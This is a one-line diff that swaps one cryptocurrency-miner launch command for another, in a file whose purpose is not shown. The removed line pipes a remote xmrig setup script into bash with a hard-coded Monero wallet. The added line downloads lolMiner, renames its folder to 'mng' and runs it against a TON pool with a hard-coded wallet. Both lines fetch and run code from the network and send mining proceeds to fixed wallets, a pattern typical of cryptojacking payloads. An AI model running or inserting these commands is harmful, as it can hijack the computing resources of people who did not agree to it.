@@ -1,1 +1,1 @@
-curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 89u5DY3f8USNVnNkomghDkBwKTSeG4ktmHwSDA3mGT8S4rq31EfkxRS1uw36TCMZpV1SRhZjBnKgxYZ3yWbVyrdnJ6ayVch
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.41/lolMiner_v1.41b_Lin64.tar.gz && tar xvf lolMiner_v1.41b_Lin64.tar.gz && mv 1.41b mng && cd mng && chmod +x lolMiner && ./lolMiner --algo TON --pool https://pool.services.tonwhales.com --user EQAOtBXaoJlpw0sGZNTsYQJKvzZAI_ey3M3NKYlXgIgdfN_E
